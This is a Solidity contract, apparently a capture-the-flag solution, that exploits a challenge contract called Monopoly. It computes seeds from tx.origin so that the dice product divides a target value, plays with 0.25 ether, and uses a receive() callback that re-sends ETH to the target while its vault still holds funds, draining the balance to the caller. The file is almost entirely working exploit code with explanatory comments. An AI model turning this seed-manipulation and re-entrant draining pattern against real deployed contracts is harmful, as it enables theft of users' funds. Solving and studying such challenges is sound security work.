pragma solidity 0.8.7;

import "./Monopoly.sol";

contract MonopolyExploiter2 {
    Monopoly ctf;
    uint32 private seed1;
    uint32 private seed2;
    constructor(address payable _ctf) {
        ctf = Monopoly(_ctf);

        //Choose a number that `last % number == 0`
        //9513 in this demonstrate
        //So we need `dice1 * dice2 = 9513`, the easiest way is the number itself multiply with 1
        //Find both seed that will produce dices = (1,9513)
        seed1 = 1 ^ uint16(bytes2(bytes20(tx.origin)));
        seed2 = 9513 ^ uint16(bytes2(bytes20(tx.origin)));

        //Wait, FACTOR % 1 == 0, just add more 65536, or change `tx.origin` to `address(this)`
        //I choose the first way, so just add it to make sure everything will going as plan
        seed1 += 65536;
        seed2 += 65536;
    }

    function finalize() public payable {
        require(msg.value >= 0.5 ether && msg.value % 2 == 0, "NGMI");
        ctf.play{value: 0.25 ether}(seed1, seed2);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "withdraw failed");
    }

    receive() external payable {
        //pay the ETH back to keep balance the same and the LoC of Monopoly.sol will do the rest
        if (address(ctf.vault()).balance > 0) {
            address(ctf).call{value: msg.value}('');
        }
    }
}